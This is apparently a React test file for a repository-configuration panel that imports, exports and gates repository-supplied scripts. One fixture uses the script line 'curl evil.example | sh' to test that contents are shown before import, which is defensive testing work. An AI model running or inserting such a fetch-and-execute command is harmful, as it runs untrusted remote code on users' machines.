import { render, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { beforeEach, describe, expect, it, vi } from 'vitest'

import type { RepoConfigItem, RepoConfigView, RepoItemId } from '@core/repoConfig.js'
import type { ResolvedScript, ScriptsInWorkspace } from '@core/repoSource.js'

import type { Result } from '../../../preload/index.js'
import { octopus } from '../test/octopus.js'
import { RepoConfig } from './RepoConfig.js'

beforeEach(() => {
  octopus()
})

/**
 * One item, with the state derived from which side holds it.
 *
 * Taking the state as an argument let a test render a combination the service
 * never produces — `same` with nothing on either side, say — and then assert
 * whatever it liked about it. The rule here mirrors `compareRepoItem`, which
 * `repoConfig.test.ts` covers directly and which is the authority on it.
 */
function item(
  id: RepoItemId,
  path: string,
  repository: string | null,
  app: string | null
): RepoConfigItem {
  const state =
    repository === null
      ? 'onlyInApp'
      : app === null
        ? 'onlyInRepository'
        : repository === app
          ? 'same'
          : 'differs'

  return { id, path, state, repository, app }
}

const SETUP = '.octopus/scripts/setup.sh'
const RUN = '.octopus/scripts/run.sh'
const CARRY = '.octopus/carry'
const PROJECT = '.octopus/project.json'

function view(overrides: Partial<RepoConfigView> = {}): RepoConfigView {
  return { present: false, ignored: false, items: [], ...overrides }
}

function offer(overrides: Partial<RepoConfigView>): void {
  vi.mocked(octopus().projects.repoConfig).mockResolvedValue({
    ok: true,
    value: view(overrides)
  })
}

/** A script the checkout supplies, as `resolveScripts` would report it. */
function fromRepo(from: string): ResolvedScript {
  return {
    kind: 'setup',
    source: 'repoConductor',
    from,
    run: { type: 'command', command: 'npm ci' },
    contents: 'npm ci'
  }
}

function runs(value: ScriptsInWorkspace): void {
  vi.mocked(octopus().projects.scripts).mockResolvedValue({ ok: true, value })
}

/** A promise a test settles when it chooses, for racing two answers. */
function pending<T>(): { promise: Promise<T>; settle: (value: T) => void } {
  let resolve: ((value: T) => void) | undefined
  const promise = new Promise<T>((capture) => {
    resolve = capture
  })

  return {
    promise,
    settle: (value) => {
      resolve?.(value)
    }
  }
}

describe('RepoConfig', () => {
  it('says when the repository carries nothing yet', async () => {
    offer({ items: [item('project', PROJECT, null, '{}')] })

    render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={vi.fn()}
      />
    )

    expect(await screen.findByText(/carries nothing yet/i)).toBeInTheDocument()
  })

  it('lists each file by the name it has in the repository', async () => {
    offer({ present: true, items: [item('script.setup', SETUP, 'npm ci\n', 'npm install\n')] })

    render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={vi.fn()}
      />
    )

    // Once on each side of the move — what can come in, and what can go out.
    await waitFor(() => {
      expect(screen.getAllByText(SETUP)).toHaveLength(2)
    })
    expect(screen.getAllByText('differs')).toHaveLength(2)
  })

  /*
   * A script arriving from a repository is somebody else's shell, and importing
   * one nobody has read is the thing this panel exists to avoid.
   */
  it('shows what a file holds before it is imported', async () => {
    offer({
      present: true,
      items: [item('script.setup', SETUP, 'curl evil.example | sh\n', null)]
    })

    render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={vi.fn()}
      />
    )

    const show = await screen.findByRole('button', { name: /show what/i })
    expect(screen.queryByText(/evil\.example/)).not.toBeInTheDocument()

    await userEvent.click(show)

    expect(screen.getByText(/evil\.example/)).toBeInTheDocument()

    await userEvent.click(show)
    expect(screen.queryByText(/evil\.example/)).not.toBeInTheDocument()
  })

  // Only what the repository has can be read, so the row that can only go out
  // has nothing to open — and offering a control that shows nothing is worse
  // than not offering one.
  it('offers nothing to open on a file the repository does not have', async () => {
    offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })

    render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={vi.fn()}
      />
    )

    await screen.findByRole('button', { name: 'Export' })
    expect(screen.queryByRole('button', { name: /show what/i })).not.toBeInTheDocument()
  })

  it('imports everything ticked and tells the dialog the project may have changed', async () => {
    offer({
      present: true,
      items: [item('carry', CARRY, '.env\n', null), item('script.run', RUN, 'npm run dev\n', null)]
    })
    const onImported = vi.fn()

    render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={onImported}
      />
    )

    await userEvent.click(await screen.findByRole('button', { name: 'Import' }))

    expect(octopus().projects.importRepoConfig).toHaveBeenCalledWith('planner', [
      'carry',
      'script.run'
    ])
    expect(onImported).toHaveBeenCalled()
  })

  it('leaves out what was unticked', async () => {
    offer({
      present: true,
      items: [item('carry', CARRY, '.env\n', null), item('script.run', RUN, 'npm run dev\n', null)]
    })

    render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={vi.fn()}
      />
    )

    await userEvent.click(await screen.findByRole('checkbox', { name: CARRY }))
    await userEvent.click(screen.getByRole('button', { name: 'Import' }))

    expect(octopus().projects.importRepoConfig).toHaveBeenCalledWith('planner', ['script.run'])
  })

  it('exports what the app holds, and never asks for an export of nothing', async () => {
    offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })

    render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={vi.fn()}
      />
    )

    expect(await screen.findByRole('button', { name: 'Import' })).toBeDisabled()

    await userEvent.click(screen.getByRole('button', { name: 'Export' }))
    expect(octopus().projects.exportRepoConfig).toHaveBeenCalledWith('planner', ['project'])
  })

  it('unticks and reticks a file on the way out', async () => {
    offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })

    render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={vi.fn()}
      />
    )

    const box = await screen.findByRole('checkbox', { name: PROJECT })
    await userEvent.click(box)
    expect(screen.getByRole('button', { name: 'Export' })).toBeDisabled()

    await userEvent.click(box)
    expect(screen.getByRole('button', { name: 'Export' })).toBeEnabled()
  })

  // Both lists are read again afterwards, so a file that has just been written
  // stops claiming the two sides differ.
  it('reads both sides again once something has moved', async () => {
    offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })

    render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={vi.fn()}
      />
    )
    await userEvent.click(await screen.findByRole('button', { name: 'Export' }))

    await waitFor(() => {
      expect(octopus().projects.repoConfig).toHaveBeenCalledTimes(2)
    })
  })

  // An ignored folder makes exporting into it a change nobody will ever
  // receive, which is worth saying before somebody exports twice.
  it('warns when git ignores the folder', async () => {
    offer({ ignored: true, items: [] })

    render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={vi.fn()}
      />
    )

    expect(await screen.findByText(/git ignores/i)).toBeInTheDocument()
  })

  it('reports a repository it could not read', async () => {
    vi.mocked(octopus().projects.repoConfig).mockResolvedValue({
      ok: false,
      error: 'raw',
      code: 'repoConfigSymlink',
      params: { path: '.octopus' }
    })

    render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={vi.fn()}
      />
    )

    expect(await screen.findByText(/symbolic link/i)).toBeInTheDocument()
  })

  it('reports a refused import and leaves the project alone', async () => {
    offer({ present: true, items: [item('carry', CARRY, '.env\n', null)] })
    vi.mocked(octopus().projects.importRepoConfig).mockResolvedValue({
      ok: false,
      error: 'raw',
      code: 'repoConfigMalformed',
      params: { path: PROJECT }
    })
    const onImported = vi.fn()

    render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={onImported}
      />
    )

    await userEvent.click(await screen.findByRole('button', { name: 'Import' }))

    expect(await screen.findByText(/does not describe a project/i)).toBeInTheDocument()
    expect(onImported).not.toHaveBeenCalled()
  })

  // The other direction fails differently — a link in the folder refuses the
  // write — and a panel that reports one and swallows the other is worse than
  // one that reports neither, because it looks like it is telling you.
  it('reports a refused export', async () => {
    offer({ items: [item('project', PROJECT, null, '{"baseBranch":"main"}')] })
    vi.mocked(octopus().projects.exportRepoConfig).mockResolvedValue({
      ok: false,
      error: 'raw',
      code: 'repoConfigSymlink',
      params: { path: '.octopus/scripts' }
    })

    render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={vi.fn()}
      />
    )

    await userEvent.click(await screen.findByRole('button', { name: 'Export' }))

    expect(await screen.findByText(/symbolic link/i)).toBeInTheDocument()
  })

  it('shows that it is still reading before anything has arrived', () => {
    vi.mocked(octopus().projects.repoConfig).mockReturnValue(new Promise(() => undefined))

    render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={vi.fn()}
      />
    )

    expect(screen.getByText(/reading the repository/i)).toBeInTheDocument()
  })

  /*
   * The abort guard, asserted on something a person could see. A test that
   * unmounted and then checked the panel was gone would pass with the guard
   * deleted — after an unmount nothing is on screen either way. Two projects
   * answering out of order is the same guard and is visible.
   */
  it('drops an answer that arrives after the project has changed', async () => {
    const planner = pending<Result<RepoConfigView>>()
    const ledger = pending<Result<RepoConfigView>>()
    vi.mocked(octopus().projects.repoConfig)
      .mockReturnValueOnce(planner.promise)
      .mockReturnValueOnce(ledger.promise)

    const { rerender } = render(
      <RepoConfig
        projectId="planner"
        trusted={false}
        onTrustChange={vi.fn()}
        onImported={vi.fn()}
      />
    )
    rerender(
      <RepoConfig projectId="ledger" trusted={false} onTrustChange={vi.fn()} onImported={vi.fn()} />
    )

    ledger.settle({
      ok: true,
      value: view({ present: true, items: [item('carry', CARRY, '.env\n', null)] })
    })
    expect(await screen.findByText(CARRY)).toBeInTheDocument()

    planner.settle({
      ok: true,
      value: view({ present: true, items: [item('script.setup', SETUP, 'npm ci\n', null)] })
    })

    await waitFor(() => {
      expect(screen.queryByText(SETUP)).not.toBeInTheDocument()
    })
    expect(screen.getByText(CARRY)).toBeInTheDocument()
  })

  describe('what the repository runs', () => {
    it('says nothing runs from here when the checkout supplies none', async () => {
      offer({})

      render(
        <RepoConfig
          projectId="planner"
          trusted={false}
          onTrustChange={vi.fn()}
          onImported={vi.fn()}
        />
      )

      expect(await screen.findByText(/supplies no scripts/i)).toBeInTheDocument()
    })

    it('names each script the checkout supplies and the file it came from', async () => {
      offer({})
      runs({ approved: true, scripts: { setup: fromRepo('.conductor/settings.toml') } })

      render(
        <RepoConfig
          projectId="planner"
          trusted={false}
          onTrustChange={vi.fn()}
          onImported={vi.fn()}
        />
      )

      expect(await screen.findByText('.conductor/settings.toml')).toBeInTheDocument()
      expect(screen.getByText(/have been read and are allowed/i)).toBeInTheDocument()
    })

    it('warns while they are still waiting to be allowed', async () => {
      offer({})
      runs({ approved: false, scripts: { setup: fromRepo('.octopus/scripts/setup.sh') } })

      render(
        <RepoConfig
          projectId="planner"
          trusted={false}
          onTrustChange={vi.fn()}
          onImported={vi.fn()}
        />
      )

      expect(await screen.findByText(/have not been read yet/i)).toBeInTheDocument()
    })

    it('leaves the list empty when the checkout could not be read', async () => {
      // A settings file with conflict markers in it. The Scripts tab is where
      // the reason belongs; here it simply supplies nothing.
      offer({})
      vi.mocked(octopus().projects.scripts).mockResolvedValue({ ok: false, error: 'broken' })

      render(
        <RepoConfig
          projectId="planner"
          trusted={false}
          onTrustChange={vi.fn()}
          onImported={vi.fn()}
        />
      )

      expect(await screen.findByText(/supplies no scripts/i)).toBeInTheDocument()
    })

    it('leaves out a script the project itself wrote, which is not gated', async () => {
      offer({})
      runs({
        approved: true,
        scripts: {
          setup: {
            kind: 'setup',
            source: 'project',
            from: '/scripts/setup.sh',
            run: { type: 'file', path: '/scripts/setup.sh' },
            contents: '#!/bin/sh\n'
          }
        }
      })

      render(
        <RepoConfig
          projectId="planner"
          trusted={false}
          onTrustChange={vi.fn()}
          onImported={vi.fn()}
        />
      )

      expect(await screen.findByText(/supplies no scripts/i)).toBeInTheDocument()
    })

    it('hands the switch to the dialog, which holds the project', async () => {
      offer({})
      const onTrustChange = vi.fn()

      render(
        <RepoConfig
          projectId="planner"
          trusted={false}
          onTrustChange={onTrustChange}
          onImported={vi.fn()}
        />
      )

      await userEvent.click(await screen.findByRole('checkbox'))

      expect(onTrustChange).toHaveBeenCalledWith(true)
    })

    it('reads again when the switch moves, because the answer changes with it', async () => {
      offer({})

      const { rerender } = render(
        <RepoConfig
          projectId="planner"
          trusted={false}
          onTrustChange={vi.fn()}
          onImported={vi.fn()}
        />
      )
      await waitFor(() => {
        expect(octopus().projects.scripts).toHaveBeenCalledTimes(1)
      })

      rerender(
        <RepoConfig projectId="planner" trusted onTrustChange={vi.fn()} onImported={vi.fn()} />
      )

      await waitFor(() => {
        expect(octopus().projects.scripts).toHaveBeenCalledTimes(2)
      })
    })
  })
})
